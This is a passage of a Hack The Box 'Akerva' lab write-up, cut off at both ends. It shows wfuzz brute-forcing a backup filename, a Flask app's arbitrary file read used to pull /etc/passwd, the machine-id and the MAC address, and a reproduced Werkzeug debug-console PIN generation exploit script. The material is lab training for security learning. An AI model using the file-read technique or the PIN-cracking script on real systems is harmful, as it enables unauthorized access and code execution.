+</pre></table></code></div></div><p>The file will be saved as</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>backup_<span class="si">$(</span><span class="nb">date</span> +%Y%m%d%H%M%S<span class="si">)</span>
+</pre></table></code></div></div><p>Suppose the time when the backup is started was <strong>18 Jun 2020 13:00:00</strong></p><p>The file will be saved as name</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>backup_202006180000.zip
+</pre></table></code></div></div><p>Since i dont know on which <code class="language-plaintext highlighter-rouge">exact</code> <strong>minute</strong> and <strong>sec</strong> the backup is started i can <code class="language-plaintext highlighter-rouge">FUZZ</code> the time since it is all only about the <code class="language-plaintext highlighter-rouge">mins</code> and <code class="language-plaintext highlighter-rouge">secs</code> so i can simply <strong>FUZZ</strong> the <strong>Minutes</strong> and <strong>seconds</strong>.</p><h2 id="fuzzing-the-file">Fuzzing the file</h2><p>The <code class="language-plaintext highlighter-rouge">wordlist</code> that i am using is just <strong>0000-9999</strong> Since the minute and</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>➜  akerva wfuzz <span class="nt">-u</span> http://akerva.htb/backups/backup_2020061813FUZZ.zip <span class="nt">-w</span> 4-digits-0000-9999.txt <span class="nt">--hc</span> 404                   
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://akerva.htb/backups/backup_2020061813FUZZ.zip
+Total requests: 10000
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
+<span class="o">===================================================================</span>
+
+000005850:   200        82458    808129   20937179    <span class="s2">"5849"</span>  
+</pre></table></code></div></div><p>Nice !! i can simple download the file now……</p><p>Just append <code class="language-plaintext highlighter-rouge">5849</code> and remove <strong>FUZZ</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>➜  akerva wget http://akerva.htb/backups/backup_20200618155849.zip
+<span class="nt">--2020-06-18</span> 11:21:44--  http://akerva.htb/backups/backup_20200618155849.zip
+Resolving akerva.htb <span class="o">(</span>akerva.htb<span class="o">)</span>... 10.13.37.11
+Connecting to akerva.htb <span class="o">(</span>akerva.htb<span class="o">)</span>|10.13.37.11|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 22071775 <span class="o">(</span>21M<span class="o">)</span> <span class="o">[</span>application/zip]
+Saving to: ‘backup_20200618155849.zip’
+
+backup_20200618155849.zip                            100%[<span class="o">=====================================================================================================================&gt;]</span>  21.05M  1.99MB/s    <span class="k">in </span>24s     
+
+2020-06-18 11:22:09 <span class="o">(</span>883 KB/s<span class="o">)</span> - ‘backup_20200618155849.zip’ saved <span class="o">[</span>22071775/22071775]
+</pre></table></code></div></div><p>Its <code class="language-plaintext highlighter-rouge">downloaded</code></p><blockquote><p>Unziping the zip file</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  akerva unzip backup_20200618135849.zip    
+</pre></table></code></div></div><p>And it got <code class="language-plaintext highlighter-rouge">unzipped</code> , a new dir <code class="language-plaintext highlighter-rouge">var</code> is created in the dir where i am. and i can surf the dirs now</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>➜  html <span class="nb">ls</span> <span class="nt">-la</span>
+total 232
+drwxr-xr-x  8 root root  4096 Jun 18 11:23 <span class="nb">.</span>
+drwxr-xr-x  3 root root  4096 Jun 18 11:23 ..
+dr-xr-xrwx  2 root root  4096 Jun 13 07:21 backups
+dr-xr-xr-x  2 root root  4096 Feb  8 12:32 dev
+<span class="nt">-rw-r--r--</span>  1 root root   405 Feb  8 09:07 index.php
+<span class="nt">-rw-r--r--</span>  1 root root 19935 Feb 10 10:56 license.txt
+<span class="nt">-rw-r--r--</span>  1 root root  7278 Feb 10 10:56 readme.html
+drwxr-xr-x  2 root root  4096 Feb  8 11:04 scripts
+<span class="nt">-rw-r--r--</span>  1 root root  6912 Feb  8 08:15 wp-activate.php
+drwxr-xr-x  9 root root  4096 Feb  8 08:15 wp-admin
+<span class="nt">-rw-r--r--</span>  1 root root   351 Feb  8 08:15 wp-blog-header.php
+<span class="nt">-rw-r--r--</span>  1 root root  2275 Feb  8 08:15 wp-comments-post.php
+<span class="nt">-rw-rw-rw-</span>  1 root root  3244 Feb 10 12:14 wp-config.php
+<span class="nt">-rw-r--r--</span>  1 root root  2913 Feb  8 08:15 wp-config-sample.php
+drwxr-xr-x  6 root root  4096 Feb 10 11:18 wp-content
+<span class="nt">-rw-r--r--</span>  1 root root  3940 Feb  8 08:15 wp-cron.php
+drwxr-xr-x 21 root root 12288 Feb  8 08:15 wp-includes
+<span class="nt">-rw-r--r--</span>  1 root root  2496 Feb  8 08:15 wp-links-opml.php
+<span class="nt">-rw-r--r--</span>  1 root root  3300 Feb  8 08:15 wp-load.php
+<span class="nt">-rw-r--r--</span>  1 root root 48437 Feb 10 10:56 wp-login.php
+<span class="nt">-rw-r--r--</span>  1 root root  8501 Feb  8 08:15 wp-mail.php
+<span class="nt">-rw-r--r--</span>  1 root root 18824 Feb  8 08:15 wp-settings.php
+<span class="nt">-rw-r--r--</span>  1 root root 31111 Feb  8 08:15 wp-signup.php
+<span class="nt">-rw-r--r--</span>  1 root root  4755 Feb  8 08:15 wp-trackback.php
+<span class="nt">-rw-r--r--</span>  1 root root  3133 Feb  8 08:15 xmlrpc.php
+</pre></table></code></div></div><p>So..there are many files inclusing the <code class="language-plaintext highlighter-rouge">dev</code> sir which was forbidden for me….</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  dev <span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+dr-xr-xr-x 2 root root 4096 Feb  8 12:32 <span class="nb">.</span>
+drwxr-xr-x 8 root root 4096 Jun 18 11:23 ..
+<span class="nt">-r-xr-xr-x</span> 1 root root   55 Feb  8 11:36 .htaccess
+<span class="nt">-r-xr-xr-x</span> 1 root root 1015 Feb  8 12:32 space_dev.py
+</pre></table></code></div></div><blockquote><p><strong>dev/space_dev.py</strong></p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask_httpauth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">from</span> <span class="nn">werkzeug.security</span> <span class="kn">import</span> <span class="n">generate_password_hash</span><span class="p">,</span> <span class="n">check_password_hash</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">()</span>
+
+<span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"aas"</span><span class="p">:</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="s">"AKERVA{#4 - Flag}"</span><span class="p">)</span>
+        <span class="p">}</span>
+
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">verify_password</span>
+<span class="k">def</span> <span class="nf">verify_password</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">check_password_hash</span><span class="p">(</span><span class="n">users</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">password</span><span class="p">)</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s">'Hello, World!'</span>
+
+<span class="c1"># TODO
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/download'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">downloaded_file</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/file"</span><span class="p">)</span>
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">file</span><span class="p">():</span>
+	<span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'filename'</span><span class="p">)</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+			<span class="k">return</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">return</span> <span class="s">'error'</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">'__name__'</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">,</span> <span class="s">'__name__'</span><span class="p">)))</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s">'5000'</span><span class="p">,</span> <span class="n">debug</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
+</pre></table></code></div></div><p>And we got the <code class="language-plaintext highlighter-rouge">Flag</code> here and it is also a <code class="language-plaintext highlighter-rouge">password</code> of something and username <code class="language-plaintext highlighter-rouge">aas</code></p><h1 id="5----flag">#5 - Flag</h1><p>I can confirm that the <code class="language-plaintext highlighter-rouge">creds</code> are working on the port <strong>5000</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-5.png" alt="Port-5000 login" /></p><p>So nothing is on initial page Beeter we <code class="language-plaintext highlighter-rouge">fuzz</code> it further….</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>prashant wfuzz <span class="nt">-u</span> http://10.13.37.11:5000/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 404
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation <span class="k">for </span>more information.
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.13.37.11:5000/FUZZ
+Total requests: 220560
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
+<span class="o">===================================================================</span>
+                                                                                             
+000000014:   401        0 L      2 W      19 Ch       <span class="s2">""</span>                                                                            
+000000017:   401        0 L      2 W      19 Ch       <span class="s2">"download"</span>                                                                                          
+000000759:   401        0 L      2 W      19 Ch       <span class="s2">"file"</span>                                                                                                
+000003644:   200        52 L     186 W    1985 Ch     <span class="s2">"console"</span>                             
+</pre></table></code></div></div><p>Got some <code class="language-plaintext highlighter-rouge">Cool</code> things from here i just need to look into these</p><blockquote><p>download</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-6.png" alt="Download-console" /></p><p>There is a <strong>python interactive shell</strong></p><p>And filled with some kinds of errors…..</p><p>There is a mention of the file we got from the <code class="language-plaintext highlighter-rouge">dev</code> dir from that backup file</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">File</span> <span class="s">"/var/www/html/dev/space_dev.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">29</span><span class="p">,</span> <span class="ow">in</span> <span class="n">download</span>
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-7.png" alt="Download-console" /></p><p>And if i look at the file we have , I can see that the same kind of code that is being used on the website</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="c1"># TODO
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/download'</span><span class="p">)</span>
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">downloaded_file</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/file"</span><span class="p">)</span>
+<span class="o">@</span><span class="n">auth</span><span class="p">.</span><span class="n">login_required</span>
+<span class="k">def</span> <span class="nf">file</span><span class="p">():</span>
+	<span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'filename'</span><span class="p">)</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+			<span class="k">return</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">return</span> <span class="s">'error'</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="s">'__name__'</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">__class__</span><span class="p">,</span> <span class="s">'__name__'</span><span class="p">)))</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s">'5000'</span><span class="p">,</span> <span class="n">debug</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
+</pre></table></code></div></div><p>And there we can see its opening a new file called <code class="language-plaintext highlighter-rouge">file</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/file"</span><span class="p">)</span>
+</pre></table></code></div></div><p>And the file has a parameter called <code class="language-plaintext highlighter-rouge">filename</code> which is opening a new file as shown in code in read mode and the whatever we specify in <code class="language-plaintext highlighter-rouge">?filename=</code> its going to read that file if the file doesnt exist or it cant read it , it will show <code class="language-plaintext highlighter-rouge">error</code>. Simple</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'filename'</span><span class="p">)</span>
+</pre></table></code></div></div><h2 id="lfi">LFi</h2><p>The situation is same as <code class="language-plaintext highlighter-rouge">lfi</code> since we can read a file I can confirm the <strong>lfi</strong> by reading a <strong>sensitive</strong> file <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p><blockquote><p>/etc/passwd</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-8.png" alt="Download-console" /></p><p>There is a <code class="language-plaintext highlighter-rouge">user</code> in home dir called <code class="language-plaintext highlighter-rouge">aas</code></p><blockquote><p>flag.txt</p></blockquote><p>I can simply guess that there could be a <code class="language-plaintext highlighter-rouge">flag</code> simply guessed it as <strong>flag.txt</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-9.png" alt="flag.txt" /></p><p>I tried to get the <code class="language-plaintext highlighter-rouge">private-ssh</code> keys since ssh port is opened but no…its doesnt exist or we are not have right perms</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-10.png" alt="id_rsa.txt" /></p><h1 id="6---flag">#6 - Flag</h1><p>There is one more thing i got from the <code class="language-plaintext highlighter-rouge">wfuzz</code> after fuzzing the initial dir and that is <code class="language-plaintext highlighter-rouge">/console</code></p><p>there is an <code class="language-plaintext highlighter-rouge">interactve</code> <strong>console</strong> but protected by <code class="language-plaintext highlighter-rouge">pin</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-11.png" alt="console" /></p><p>I quick google search about the <strong>Python Console Pin</strong></p><blockquote><p><a href="https://werkzeug.palletsprojects.com/en/1.0.x/debug/" target="_blank">https://werkzeug.palletsprojects.com/en/1.0.x/debug/</a></p></blockquote><p>This just show me that the pin is enabled by <code class="language-plaintext highlighter-rouge">werkzeug</code> , its a dependency that is being used to protect the <strong>interactive-console</strong> with a pin</p><p>There is a <code class="language-plaintext highlighter-rouge">public</code> exploit available on web for this <code class="language-plaintext highlighter-rouge">pin</code> functionality</p><blockquote><p><a href="https://www.daehee.com/werkzeug-console-pin-exploit/" target="_blank">https://www.daehee.com/werkzeug-console-pin-exploit/</a></p></blockquote><p>Its the python code that is given to get the pin</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="s">'web3_user'</span><span class="p">,</span><span class="c1"># username
+</span>	<span class="s">'flask.app'</span><span class="p">,</span><span class="c1"># modname
+</span>	<span class="s">'Flask'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>	<span class="s">'/usr/local/lib/python3.5/dist-packages/flask/app.py'</span> <span class="c1"># getattr(mod, '__file__', None),
+</span><span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="s">'279275995014060'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address
+</span>	<span class="s">'d4e6cb65d59544f3331ea0425dc555a1'</span><span class="c1"># get_machine_id(), /etc/machine-id
+</span><span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+		<span class="k">continue</span>
+	<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+		<span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'cookiesalt'</span><span class="p">)</span>
+<span class="c1">#h.update(b'shittysalt')
+</span>
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'pinsalt'</span><span class="p">)</span>
+	<span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">'%09d'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">rv</span> <span class="o">=</span> <span class="s">'-'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+						  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+			<span class="k">break</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</pre></table></code></div></div><p>I will be needed to change the <code class="language-plaintext highlighter-rouge">code</code> to some extent….</p><ul><li>User - aas<li>/sys/class/net/ens33/address<li>/etc/machine-id</ul><p>Since i have a lfi working so i can simply get the <code class="language-plaintext highlighter-rouge">Mac-address</code> and the <code class="language-plaintext highlighter-rouge">machine-id</code></p><blockquote><p>/etc/machine-id</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-12.png" alt="console" /></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>258f132cd7e647caaf5510e3aca997c1
+</pre></table></code></div></div><blockquote><p>/sys/class/net/ens33/address</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-13.png" alt="console" /></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>00:50:56:b9:b1:29
+</pre></table></code></div></div><p>So now i need to convert the <code class="language-plaintext highlighter-rouge">mac-address</code> into the decimat according to the <code class="language-plaintext highlighter-rouge">article</code></p><p>I can use <code class="language-plaintext highlighter-rouge">python</code> for this thing</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="err">➜</span>  <span class="n">akerva</span> <span class="n">python</span>
+<span class="n">Python</span> <span class="mf">2.7</span><span class="p">.</span><span class="mi">18</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Apr</span> <span class="mi">20</span> <span class="mi">2020</span><span class="p">,</span> <span class="mi">20</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">41</span><span class="p">)</span> 
+<span class="p">[</span><span class="n">GCC</span> <span class="mf">9.3</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="mh">0x5056b9b129</span><span class="p">)</span>
+<span class="mi">345052393769</span>
+<span class="o">&gt;&gt;&gt;</span> 
+</pre></table></code></div></div><p>And one more thing in the article the owner used <code class="language-plaintext highlighter-rouge">python 3</code> in the script but in the box <code class="language-plaintext highlighter-rouge">python 2.7</code> is being used we can see that on the <code class="language-plaintext highlighter-rouge">/download</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-14.png" alt="console" /></p><p>and now my full-python script will be</p><blockquote><p>crack-pin.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
